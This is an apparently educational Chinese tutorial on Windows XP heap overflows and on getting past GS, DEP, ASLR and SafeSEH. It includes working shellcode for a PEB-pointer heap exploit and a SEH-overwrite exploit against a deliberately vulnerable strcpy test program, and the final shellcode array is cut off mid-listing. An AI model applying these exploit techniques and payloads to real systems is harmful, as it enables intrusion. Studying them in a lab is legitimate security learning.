# 溢出科普：heap overflow&溢出保护和绕过

0x00 第一部分：heap overflow
=======================

* * *

接上文,来看另外一种溢出方式:堆溢出.相对于栈溢出来说,稍微麻烦一点

本文算是一个笔记,技术有限,难免有纰漏之处,欢迎诸君斧正.

0x01 基础知识
=========

* * *

### 一.堆的结构

堆为程序运行时主动申请的内存,通常称为堆区,操作堆的api从UserMode来看有:

![test](http://drops.javaweb.org/uploads/images/762181524568b2df852eb7b37bc474a1041cfb17.jpg)

例如malloc申请一块内存会先调用HeapCreate()为自己创建一块堆区.

堆区由不同大小的堆块组成,由堆表来索引所有堆块.

![test](http://drops.javaweb.org/uploads/images/4507dde01dda77b658926bbd7ad70724b652623d.jpg)

堆块由块首和块身构成,块首占8字节,由块大小和块计算单位和是否占用等信息,块身紧跟在块首,在提到一个块大小的时候,要加上块首大小.如请求分配32字节,实际会分配40字节.我们来看一下堆块的结构:

![test](http://drops.javaweb.org/uploads/images/48c0bae494937bee514d59095d49df0413e5b298.jpg)

```
0:000> dt _HEAP_ENTRY
 ntdll!_HEAP_ENTRY
+0x000 Size : Uint2B // 堆块的大小（以堆粒度为单位， 含块首） 
+0x002 PreviousSize : Uint2B // 前一堆块的大小
+0x000 SubSegmentCode : Ptr32 Void +0x004 SmallTagIndex : UChar 
+0x005 Flags : UChar // 表示堆块的状态 
    Flags: 
    0x01 堆块正在被程序或者堆管理器使用 
    0x04 堆块使用了填充模式（File Pattern） 
    0x08 堆块是直接从虚拟内存管理器中分配而来的 
    0x10 堆块是未提交范围之前的最后一个堆块
+0x006 UnusedBytes : UChar // 堆块中未被用户使用的字节数（含块首） +0x007 SegmentIndex : UChar // 代表的堆块状态

```

堆表分为空表和快表,索引所有空闲态堆块,空表是一个双向链表,索引的每一个堆块有前向指针(flink)和后向指针(blink),每个指针占四字节,在空闲态时两个指针存放在块身,占用态时块身将全部用来存放数据.

占用态块身:

![test](http://drops.javaweb.org/uploads/images/2374ee46bf201c55d091db0ea72764c0ec571b1b.jpg)

### 二:堆表的结构

空表(freelist)和快表(lookaside)都有128条记录,空表又有零号空表和普通空表之说.

零号空表(freelist[0])索引所有大于1024字节的堆块,升序排列.普通空表(freelist[1](http://drops.javaweb.org/uploads/images/762181524568b2df852eb7b37bc474a1041cfb17.jpg))索引大小为8的堆块,freelist[2](http://drops.javaweb.org/uploads/images/4507dde01dda77b658926bbd7ad70724b652623d.jpg)索引16字节,依次递增.直到freelist[127]索引大小为1016字节的堆块.

![test](http://drops.javaweb.org/uploads/images/ab93eb5be695294e5b97476f3a86cc918c81fc94.jpg)

快表为单向链表,索引的堆块均有占用态标记,不会发生堆块合并,每条记录只有4个节点,优先分配优先链入.

![test](http://drops.javaweb.org/uploads/images/3a1b83a7d24de1ad4d3df3250be9a404f9a74941.jpg)

### 三:堆块操作

**1.堆块分配和释放**

假如有如下指令:

```
...
HLOACL test;
HANDLE hp;
hp =HeapCreate(0,0x1000,0x100000);
test=HeapAlloc(hp,HEAP_ZERO_MEMORY,16);
...

```

HeapAlloc请求分配16字节,加上块首8字节,实际则为24字节,除以8,定位到要分配的记录.如freelist[3](http://drops.javaweb.org/uploads/images/48c0bae494937bee514d59095d49df0413e5b298.jpg).

假如24字节大小的堆块不存在于堆表记录索引中,会从大于24字节的记录里找到最小的一条记录分配,假如从freelist[5](http://drops.javaweb.org/uploads/images/ab93eb5be695294e5b97476f3a86cc918c81fc94.jpg)分配(40字节),会划分出24字节返回给程序使用,该堆块块首设置为占用态,另外的16字节装载到相应的空闲链表,并重新分配块首.

![test](http://drops.javaweb.org/uploads/images/0ac715638b422348bfeccd542243cc08c17e36e3.jpg)

如图,A节点拆卸后,会在Blink指向的地址处写入Flink,假如我们能控制这两个指针的值,就获得了一次任意地址写入4字节的机会.

**2.堆块合并**

空闲并相邻的堆块会进行合并,避免内存碎片.

(1)释放一个堆块后,堆管理器会检查相邻堆块是否空闲  
(2)假如空闲就合并成一个大堆块  
(3)将大堆块设为空闲态  
(4)更新空闲列表

0x02 堆调试
========

* * *

code:

```
//build:VC++6.0
//os:windows xp sp3
//download: ed2k://|file|ZRMPSEL_CN.iso|402690048|00D1BDA0F057EDB8DA0B29CF5E188788|/
#include <windows.h>
int main(){
    char shellcode[]="\x90";
    HLOCAL h1=0,h2=0;
    HANDLE hp;
    hp=HeapCreate(0,0x8000,0x10000);
    __asm int 3
    h1=HeapAlloc(hp,HEAP_ZERO_MEMORY,200);

    //memcpy(h1,shellcode,0x200);
    h2=HeapAlloc(hp,HEAP_ZERO_MEMORY,8);
    HeapFree(hp,0,h1);
    HeapFree(hp,0,h2);
    return 0;
}

```

如上代码,假如注释掉`__asm int 3`直接载入调试器,堆管理器会检测到处于调试状态,而是用调试态的堆管理策略,我们这里用int 3中断,int 3执行会触发一个异常,程序暂停,在这之前已经创建了堆区,分配了堆块,这时我们用调试器attach进程,就可以看到真实的堆了.

windbg、Immunity Debugger执行!peb都可以看到堆的结构.或者用ollydbg单击M按钮.

HeapCreate创建大小为0x8000的堆

![test](http://drops.javaweb.org/uploads/images/2cd4f5d95a30a78983236a3792bb8b6d1b5d103c.jpg)

windbg`!heap -stat`

```
0:001> !heap -stat
_HEAP 003c0000
     Segments            00000001
         Reserved  bytes 00010000
         Committed bytes 00008000
     VirtAllocBlocks     00000000
         VirtAlloc bytes 00000000
_HEAP 003a0000
     Segments            00000001
         Reserved  bytes 00010000
         Committed bytes 00008000
     VirtAllocBlocks     00000000
         VirtAlloc bytes 00000000
_HEAP 00240000
     Segments            00000001
         Reserved  bytes 00010000
         Committed bytes 00006000
     VirtAllocBlocks     00000000
         VirtAlloc bytes 00000000
_HEAP 00140000
     Segments            00000001
         Reserved  bytes 00100000
         Committed bytes 00006000
     VirtAllocBlocks     00000000
         VirtAlloc bytes 00000000
_HEAP 00250000
     Segments            00000001
         Reserved  bytes 00010000
         Committed bytes 00003000
     VirtAllocBlocks     00000000
         VirtAlloc bytes 00000000
_HEAP 00380000
     Segments            00000001
         Reserved  bytes 00010000
         Committed bytes 00002000
     VirtAllocBlocks     00000000
         VirtAlloc bytes 00000000

```

查看003c0000堆区的信息

```
0:001> !heap -h 003c0000
Index   Address  Name      Debugging options enabled
  6:   003c0000 
    Segment at 003c0000 to 003d0000 (00008000 bytes committed)
    Flags:                00001002
    ForceFlags:           00000000
    Granularity:          8 bytes
    Segment Reserve:      00100000
    Segment Commit:       00002000
    DeCommit Block Thres: 00000200
    DeCommit Total Thres: 00002000
    Total Free Size:      00000c2f
    Max. Allocation Size: 7ffdefff
    Lock Variable at:     003c0608
    Next TagIndex:        0000
    Maximum TagIndex:     0000
    Tag Entries:          00000000
    PsuedoTag Entries:    00000000
    Virtual Alloc List:   003c0050
    UCR FreeList:        003c0598
    FreeList Usage:      00000000 00000000 00000000 00000000
    FreeList[ 00 ] at 003c0178: 003c1e90 . 003c1e90   (1 block )
    Heap entries for Segment00 in Heap 003c0000
        003c0640: 00640 . 00040 [01] - busy (40)
        003c0680: 00040 . 01808 [01] - busy (1800)
        003c1e88: 01808 . 06178 [10]
        003c8000:      00008000      - uncommitted bytes.

```

看到freelist[0]指向003c0178

![test](http://drops.javaweb.org/uploads/images/0bf0c8400686544c9463be8d6caf49ff60e932b8.jpg)

除了freelist[0]之外,所有的索引都指向自身,代表当前空闲链表为空.

003c0178指向尾块003c1e90

![test](http://drops.javaweb.org/uploads/images/faea7b9a61d7a313762be082bb94ccd0a2d6106a.jpg)

当完全覆盖掉当前缓冲区到时候,就会溢出到相邻的堆块,覆盖相邻堆块的块首和Flink、Blink

![test](http://drops.javaweb.org/uploads/images/f83e7678c40f74dc14b4f4619e21aa8272f99e2a.jpg)

精心构造Flink 和Blink即可实现控制程序执行流程、代码执行等目的

有兴趣的话可以用跟踪一下,观察堆块分配时堆表的变化.

0x03 溢出实例
=========

* * *

覆盖Flink Blink程序再次申请堆块时触发异常,调用所有异常处理函数,假如无法处理,系统调用默认的异常处理,弹出错误对话框,调用ExitProcess().

ExitProcess有同步线程的动作,这个动作由RtlEnterCriticalSection()和RtlLeaveCriticalSection()来完成.这两个函数我们称为临界区函数.跟信号量和锁类似,临界区是一种轻量级机制,在某一时间内,只能由一个线程来执行某个代码段.

调用这两个临界区函数会先从PEB的0x20、0x24偏移处寻找函数指针.我们现在需要做的就是覆盖这两个位置的指针.

在windbg中执行`!peb`即可看到peb的位置.

```
0:000> !peb
PEB at 7ffdf000
    InheritedAddressSpace:    No
    ReadImageFileExecOptions: No
    BeingDebugged:            Yes
    ImageBaseAddress:         00400000
    Ldr                       00241e90
    Ldr.Initialized:          Yes
    Ldr.InInitializationOrderModuleList: 00241f28 . 00241fd0
    Ldr.InLoadOrderModuleList:           00241ec0 . 00241fc0
    Ldr.InMemoryOrderModuleList:         00241ec8 . 00241fc8
----------------------
typedef struct _PEB
{
    UCHAR InheritedAddressSpace; // 00h
    UCHAR ReadImageFileExecOptions; // 01h
    UCHAR BeingDebugged; // 02h
    UCHAR Spare; // 03h
    PVOID Mutant; // 04h
    PVOID ImageBaseAddress; // 08h
    PPEB_LDR_DATA Ldr; // 0Ch
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters; // 10h
    PVOID SubSystemData; // 14h
    PVOID ProcessHeap; // 18h
    PVOID FastPebLock; // 1Ch
    PPEBLOCKROUTINE FastPebLockRoutine; // 20h
    PPEBLOCKROUTINE FastPebUnlockRoutine; // 24h
} PEB, *PPEB;

```

Peb->FastPebLockRoutine指针的内容为RtlEnterCriticalSection函数的地址,Peb->FastPebUnlockRoutine为RtlLeaveCriticalSection()地址,既0x20偏移、0x24偏移.

**ps:在xp sp1之前,PEB的位置是固定的,sp2基址浮动,2003没有FastPebLockRoutine和FastPebUnlockRoutine.**

因为shellcode也会调用ExitProcess,所以会shellcode会反复执行,应该在shellcode的头部恢复覆盖掉的值.

0day书中的代码:

```
#include <windows.h>
char shellcode[]=
"\x90\x90\x90\x90\x90"    // nop
"\x90\x90\x90\x90\x90"    // nop
            // repaire the pointer which shooted by heap shooting
"\xb8\x20\xf0\xfd\x7f"    // mov eax,7ffdf020
"\xbb\x03\x91\xf8\x77"    // mov ebx,77F89103 this addr may related to OS patch version
"\x89\x18"                // mov dword ptr ds:[eax],ebx
            // 168 bytes popwindow shellcode
"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75"
"\x05\x95\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE"
"\x06\x3A\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03"
"\xDD\x03\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53"
"\x50\x50\x53\xFF\x57\xFC\x53\xFF\x57\xF8"
"\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90"
"\x16\x01\x1A\x00\x00\x10\x00\x00" // 块首的8字节
"\x88\x06\x52\x00\x20\xf0\xfd\x7f"; // Flink+Blink,Blink为0x7ffdf020,Flink为00520688


int main()
{
    HLOCAL h1=0,h2=0;
    HANDLE hp=HeapCreate(0,0x1000,0x10000);
    //print_shellcode();return 0;
    h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,200);
    memcpy(h1,shellcode,0x200);
    //_asm int 3;
    h2=HeapAlloc(hp,HEAP_ZERO_MEMORY,8);
    return 0;
}

```

Flink的值需要在调试时确定,指向shellcode起始位置

0x04 第二部分：溢出保护和绕过
=================

* * *

我们常说的溢出,就是要覆盖缓冲区,现代的操作系统针和编译器对此种攻击做出了很多的防御措施.

第一层是编译器层面,例如gcc的stack protector,vc的gs,第二层是操作系统层面的DEP,aslr,safeseh,sehop等.

所谓知己知彼百战不殆.下文详情

0x05 编译器层面
==========

* * *

gcc在编译时会自动插入一个随机的cookie,也叫做金丝雀值(历史上用金丝雀来检查煤矿中是否有有毒气体),保存在ebp-8字节的位置,函数每次调用完成将返回地址交给eip的之前会检查cookie是否被改写,假如被改写就触发异常,程序停止执行.

看代码:

```
push ebp
mov esp,ebp
push ebx
sub esp,xxx

;插入cookie
mov eax,gs:[20]
mov [ebp-8],eax
xorl eax,eax
;插入完毕

;execute some code....
;恢复ebx和ebp和ret之前的动作:
mov eax,[ebp-8]
xor eax,gs:[20]
je true:

call stack_check_fail
;假如cookie被覆盖,xor后为1,没进入if,调用stack_check_fail触发异常

true:
add esp,20
pop ebx
pop ebp
ret

```

如图:

![test](http://drops.javaweb.org/uploads/images/a406c87328692c1c79f83e63bb50e28ad797c4e5.jpg)

vs的gs选项一样的原理.

```
sub   esp,24h
mov   eax,dword ptr [___security_cookie (408040h)]
xor   eax,dword ptr [esp+24h]
mov   dword ptr [esp+20h],eax
...
mov   ecx,dword ptr [esp+20h]
xor   ecx,dword ptr [esp+24h]
add   esp,24h
jmp   __security_check_cookie (4010B2h)

```

触发异常后,假如程序安装的异常例程没有成功处理就会交由系统默认异常处理,然后调用ExitProcess.针对此种方式,我们可以覆盖异常处理例程(seh handle)来达到控制程序执行流程的目的.稍后再说SEH的知识

0x06 DEP
========

* * *

数据执行保护(Data Execution Prevention)是一套软硬件技术,在内存上严格将代码和数据进行区分,防止数据当做代码执行.

从sp2开始作为一项安全机制引入,延续到2003、2008、win7.

DEP会将值包含内存数据的区域标记为NX(不可执行),当我们控制程序执行流程跳到shellcode时,触发异常.

可以shellcode地址写第三方dll的导出函数.例如system启动shell.

![test](http://drops.javaweb.org/uploads/images/9c545d9deb76f1542d639cdc97aa1688df9399b2.jpg)

当然了,ROP也是可以绕过dep的,以后写.

0x07 ASLR
=========

* * *

ASLR(Address space layout randomization)地址空间布局随机化,在vista之后的系统实现.

将堆地址 栈基址 PE文件基址 PEB地址随机,shellcode的起始地址无法固定

**1.用第三方为经过aslr的dll**

这种方法也适用于绕过safeseh,immunity debugger命令行执行`!mona jmp -r esp -cm aslr,safeseh`

```
---------- Mona command started on 2016-03-22 12:13:34 (v2.0, rev 427) ----------
0BADF00D   [+] Processing arguments and criteria
0BADF00D       - Pointer access level : X
0BADF00D       - Module criteria : ['aslr']
0BADF00D   [+] Generating module info table, hang on...
0BADF00D       - Processing modules
0BADF00D       - Done. Let's rock 'n roll.
0BADF00D   [+] Querying 3 modules
0BADF00D       - Querying module ntdll.dll
0BADF00D       - Querying module kernel32.dll
0BADF00D       - Querying module test.exe
0BADF00D       - Search complete, processing results
0BADF00D   [+] Preparing output file 'jmp.txt'
0BADF00D       - (Re)setting logfile jmp.txt
0BADF00D   [+] Writing results to jmp.txt
0BADF00D       - Number of pointers of type 'jmp esp' : 1
0BADF00D       - Number of pointers of type 'call esp' : 4
0BADF00D       - Number of pointers of type 'push esp # ret ' : 1
0BADF00D   [+] Results :
7C86467B     0x7c86467b : jmp esp |  {PAGE_EXECUTE_READ} [kernel32.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.5512 (C:\WINDOWS\system32\kernel32.dll)
7C934663     0x7c934663 : call esp |  {PAGE_EXECUTE_READ} [ntdll.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.5512 (C:\WINDOWS\system32\ntdll.dll)
7C97311B     0x7c97311b : call esp |  {PAGE_EXECUTE_READ} [ntdll.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.5512 (C:\WINDOWS\system32\ntdll.dll)
7C8369F0     0x7c8369f0 : call esp |  {PAGE_EXECUTE_READ} [kernel32.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.5512 (C:\WINDOWS\system32\kernel32.dll)
7C868667     0x7c868667 : call esp |  {PAGE_EXECUTE_READ} [kernel32.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.5512 (C:\WINDOWS\system32\kernel32.dll)
7C939DB0     0x7c939db0 : push esp # ret  |  {PAGE_EXECUTE_READ} [ntdll.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.5512 (C:\WINDOWS\system32\ntdll.dll)
0BADF00D       Found a total of 6 pointers
0BADF00D
           [+] This mona.py action took 0:00:01.515000 00400000  Unload C:\Documents and Settings\Administrator\桌面\test.exe
7C800000  Unload C:\WINDOWS\system32\kernel32.dll
7C920000  Unload C:\WINDOWS\system32\ntdll.dll
          Process terminated
End of session

```

**2.利用aslr的特性:**

aslr只对高位地址随机,例如0x12345678,每次重启 低地址5678是不变的,只有高地址1234会随机为别的数值,在小端机中,低位地址在内存低位,高位地址在内存高位,也就是说,在0x1234xxxx范围之内,找到我们需要的指令,例如jmp esp 0xffe4就可以实现eip跳到缓冲区的目的.

在不溢出缓冲区就能放下shellcode的情况下,我们将数据覆盖到返回地址的低位地址就可以了.

![test](http://drops.javaweb.org/uploads/images/fa79c12a31d28c327ff92ca1499d3519b7772465.jpg)

0x08 对seh的保护 safeseh、sehop
==========================

* * *

.net的sdeseh选项会将所有的异常处理例程解析成单向链表,在程序触发异常时,会将当前例程在异常链表中寻找,假如寻找不到就不触发当前例程. sehop(Structured Exception Handler Overwrite Protection结构化异常处理覆盖保护),在vista sp1之后出现,用来检测seh链表的完整性,触发异常时,假如seh链表的最后一个异常处理函数非默认,说明seh遭到破坏,sehop就会阻止当前的seh handle执行.

绕过方法在seh基础知识后面写.

0x09 异常处理机制
===========

* * *

异常处理流程:

1.  CPU捕获异常,内核结果进程控制权,进行内核态异常处理
2.  异常处理结束,控制权交给R3
3.  R3中第一个处理异常的函数是ntdll.dll中的KiUserExceptionDispatcher().
4.  KiUserExceptionDispatcher检测是否处于调试态,也就是说我们假如要调试,还需要像之前调试堆那样在程序内显式的int3中断,然后用调试器attach.
5.  非调试态下,先进行进程级异常处理VEH,再进行线程级异常处理,即遍历SEH链表.
6.  假如所有处理函数都失败,调用进程级异常处理函数UEF(UnhandleExeceptionFilter),UEF会检测`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AeDebug`下的UserDebuggerHotKey键值,假如为0,弹出错误消息对话框,提示是否打开调试器.若为1,则没有任何提示直接调用ExitProcess

SEH结构化异常处理(structured exception handling)是当异常触发时将控制权交给程序自主处理而实现的一种架构,存储在栈中,在代码内使用__try{}、__except{}时,会向当前函数栈帧安装一个异常处理例程,所有的异常处理例程会构成一张单向链表,在Immunity Debugger中 view->seh chain可以查看所有seh

![test](http://drops.javaweb.org/uploads/images/6db633e95ce628d93154d016c4032b1c20e855e5.jpg)

或者windbg

```
0:001> !exchain
003bffe4: ntdll!_except_handler3+0 (7c92e900)
  CRT scope  0, filter: ntdll!DbgUiRemoteBreakin+2f (7c970017)
                func:   ntdll!DbgUiRemoteBreakin+33 (7c970020)
Invalid exception stack at ffffffff

```

seh结构如下:

```
_EXCEPTION_REGISTRATION struc   
     prev dd ?        //前一个_EXCEPTION_REGISTRATION结构   nseh(next seh),有人也叫他provious
     handler dd ?     //异常处理例程入口  seh handle

```

段寄存器fs[0]指向栈顶之后的第一个异常处理例程,触发异常时(如除0操作,错误的内存访问等)首先调用第一个异常处理函数(seh handle),假如无法处理,依次尝试调用其他seh handle,见异常处理流程的第5、6步.

SEH链表图:

![test](http://drops.javaweb.org/uploads/images/4c4f42305debb5eaa9f1dad074adad09fe8cdf34.jpg)

![test](http://drops.javaweb.org/uploads/images/3f95b92f91461bf2a1c2e688a71d98b95ce75d1f.jpg)

可以看到,在溢出发生时,esp指向数据区,上溢4个字节是nseh,再上溢4个字节就是seh handle,假如我们寻找一个pop pop ret类的指令地址,执行到ret后,eip就会跳到seh handle上,所以这时候nseh可以设为90909090,或者是一个跳过4字节的指令.在nseh和seh handle后布置shellcode.

0x0A 绕过gs、safeseh
=================

* * *

```
#include "stdio.h"
#include "windows.h"
void GetInput(char* str, char* out)
{
    char buffer[500];
    try
    {
        strcpy(buffer,str);
        strcpy(out,buffer);
        printf("Input received : %s\n",buffer);
    }
    catch (char * strErr)
    {
        printf("No valid input received ! \n");
        printf("Exception : %s\n",strErr);
    }
}
int main()
{
    char buf2[10];
    char shellcode[]="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
    GetInput(shellcode,buf2);
    return 0;
}

```

char buffer[500]是为了开辟足够大的空间

程序运行后

```
EAX 7EFEFEFE
ECX 0012FC94 ASCII "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
EDX 41414141
EBX 7FFD6000
ESP 0012FBA4
EBP 0012FE08
ESI 004261A9 aaaa.004261A9
EDI 00130000 ASCII "Actx "
EIP 004013D1 aaaa.004013D1
C 0  ES 0023 32bit 0(FFFFFFFF)
P 1  CS 001B 32bit 0(FFFFFFFF)
A 0  SS 0023 32bit 0(FFFFFFFF)
Z 1  DS 0023 32bit 0(FFFFFFFF)
S 0  FS 003B 32bit 7FFDF000(FFF)
T 0  GS 0000 NULL
D 0
O 0  LastErr ERROR_SUCCESS (00000000)
EFL 00010246 (NO,NB,E,BE,NS,PE,GE,LE)

----------------------------------------------

SEH chain of main thread
Address    SE handler
0012FDFC   aaaa.004134A0
0012FFB0   41414141
41414141   *** CORRUPT ENTRY ***

```

可以看到seh已经被覆盖,用mona插件计算从缓冲区到seh的距离.  
`!mona pattern_create 300`生成长度为300的随机字符串,替换为shellcode,再溢出一次,执行`!mona findmsp`

```
================================================================================
----------------------------------------------------------------------------------------------------------------------------------
 Module info :
----------------------------------------------------------------------------------------------------------------------------------
 Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | NXCompat | OS Dll | Version, Modulename & Path
----------------------------------------------------------------------------------------------------------------------------------
 0x7c920000 | 0x7c9b3000 | 0x00093000 | False  | True    | False |  False   | True   | 5.1.2600.5512 [ntdll.dll] (C:\WINDOWS\system32\ntdll.dll)
 0x7c800000 | 0x7c91e000 | 0x0011e000 | False  | True    | False |  False   | True   | 5.1.2600.5512 [kernel32.dll] (C:\WINDOWS\system32\kernel32.dll)
 0x00400000 | 0x0042f000 | 0x0002f000 | False  | False   | False |  False   | False  | -1.0- [aaaa.exe] (C:\Documents and Settings\Administrator\桌面\aaaa\Debug\aaaa.exe)
----------------------------------------------------------------------------------------------------------------------------------
[+] Looking for cyclic pattern in memory
    Cyclic pattern (normal) found at 0x0042609c (length 300 bytes)
    Cyclic pattern (normal) found at 0x0012fbe4 (length 300 bytes)
    -  Stack pivot between 96 & 396 bytes needed to land in this pattern
    Cyclic pattern (normal) found at 0x0012fe44 (length 300 bytes)
    -  Stack pivot between 704 & 1004 bytes needed to land in this pattern
    Cyclic pattern (normal) found at 0x0012ff74 (length 140 bytes)
    -  Stack pivot between 1008 & 1148 bytes needed to land in this pattern
    EDX overwritten with normal pattern : 0x37654136 (offset 140)
    ECX (0x0012fc74) points at offset 144 in normal pattern (length 156)
[+] Examining SEH chain    SEH record (nseh field) at 0x0012ffb0 overwritten with normal pattern : 0x63413163 (offset 60), followed by 76 bytes of cyclic data
[+] Examining stack (entire stack) - looking for cyclic pattern
    Walking stack from 0x0012e000 to 0x0012fffc (0x00001ffc bytes)
    0x0012fbe4 : Contains normal cyclic pattern at ESP+0x60 (+96) : offset 0, length 300 (-> 0x0012fd0f : ESP+0x18c)
    0x0012fe44 : Contains normal cyclic pattern at ESP+0x2c0 (+704) : offset 0, length 300 (-> 0x0012ff6f : ESP+0x3ec)
    0x0012ff74 : Contains normal cyclic pattern at ESP+0x3f0 (+1008) : offset 0, length 140 (-> 0x0012ffff : ESP+0x47c)

```

计算出溢出长度为60字节,并列出所有加载的dll,并提示是否有safeSEH和aslr等.

根据前面的知识,构造的shellcode格式应为:buf +nseh +seh handle +shellcode

nseh 为90909090,seh handle为pop pop ret地址,buf为60长度的任意字节,ppt的地址也可以用mona来搜索,`!mona seh`

```
0x0040ba77 : pop esi # pop edi # ret  | startnull {PAGE_EXECUTE_READ} [aaaa.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Documents and Settings\Administrator\桌面\aaaa\Debug\aaaa.exe)
0x0040bb1b : pop esi # pop edi # ret  | startnull {PAGE_EXECUTE_READ} [aaaa.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Documents and Settings\Administrator\桌面\aaaa\Debug\aaaa.exe)
0x00401616 : pop ebx # pop ebp # ret  | startnull,asciiprint,ascii {PAGE_EXECUTE_READ} [aaaa.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Documents and Settings\Administrator\桌面\aaaa\Debug\aaaa.exe)
0x0040176e : pop ebx # pop ebp # ret  | startnull,asciiprint,ascii {PAGE_EXECUTE_READ} [aaaa.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Documents and Settings\Administrator\桌面\aaaa\Debug\aaaa.exe)
0x0040ec4f : pop ebx # pop ebp # ret  | startnull {PAGE_EXECUTE_READ} [aaaa.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Documents and Settings\Administrator\桌面\aaaa\Debug\aaaa.exe)
0x004018ef : pop esi # pop ebx # ret  | startnull {PAGE_EXECUTE_READ} [aaaa.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Documents and Settings\Administrator\桌面\aaaa\Debug\aaaa.exe)
0x0040cf67 : pop ebx # pop edi # ret  | startnull {PAGE_EXECUTE_READ} [aaaa.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Documents and Settings\Administrator\桌面\aaaa\Debug\aaaa.exe)
0x0040cf6d : pop ebx # pop edi # ret  | startnull {PAGE_EXECUTE_READ} [aaaa.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Documents and Settings\Administrator\桌面\aaaa\Debug\aaaa.exe)
0x0040cedb : pop edi # pop ebx # ret  | startnull {PAGE_EXECUTE_READ} [aaaa.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Documents and Settings\Administrator\桌面\aaaa\Debug\aaaa.exe)
0x0040cee2 : pop edi # pop ebx # ret  | startnull {PAGE_EXECUTE_READ} [aaaa.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Documents and Settings\Administrator\桌面\aaaa\Debug\aaaa.exe)
0x0040cee9 : pop edi # pop ebx # ret  | startnull {PAGE_EXECUTE_READ} [aaaa.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Documents and Settings\Administrator\桌面\aaaa\Debug\aaaa.exe)

```

也可以用第一篇文章提到的工具,搜索kernel,或者直接用immunity debugger搜索

![test](http://drops.javaweb.org/uploads/images/6f6746b2e264b922882e9a99518e4daeaa42d83e.jpg)

0x7c921931 小端机缘故,倒叙`\x31\x19\x92\x7c`

看最终代码,在保证没有DEP和safeSeh、safeop的情况下可顺利运行.

```
#include "stdio.h"
#include "windows.h"
void GetInput(char* str, char* out)
{

    char buffer[500];
    try
    {
        strcpy(buffer,str);
        strcpy(out,buffer);
        printf("Input received : %s\n",buffer);
    }
    catch (char * strErr)
    {
        printf("No valid input received ! \n");
        printf("Exception : %s\n",strErr);
    }
}
int main()
{
    LoadLibrary("C:\\NppFTP.dll");
    char buf2[10];
    char shellcode[]="\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x91\x91\x91\x91"  //nseh
"\x6A\x6A\x6A\x6A"  //seh handle


"\x55\x8B\xEC\x33\xC0\x50\x50\x50\xC6\x45\xF4\x4D\xC6\x45\xF5\x53"
"\xC6\x45\xF6\x56\xC6\x45\xF7\x43\xC6\x45\xF8\x52\xC6\x45\xF9\x54\xC6\x45\xFA\x2E\xC6"
"\x45\xFB\x44\xC6\x45\xFC\x4C\xC6\x45\xFD\x4C\xBA"
"\x77\x1d\x80\x7c"     
"\x52\x8D\x45\xF4\x50"
"\xFF\x55\xF0"
"\x55\x8B\xEC\x83\xEC\x2C\xB8\x63\x6F\x6D\x6D\x89\x45\xF4\xB8\x61\x6E\x64\x2E"
"\x89\x45\xF8\xB8\x63\x6F\x6D\x22\x89\x45\xFC\x33\xD2\x88\x55\xFF\x8D\x45\xF4"
"\x50\xB8"
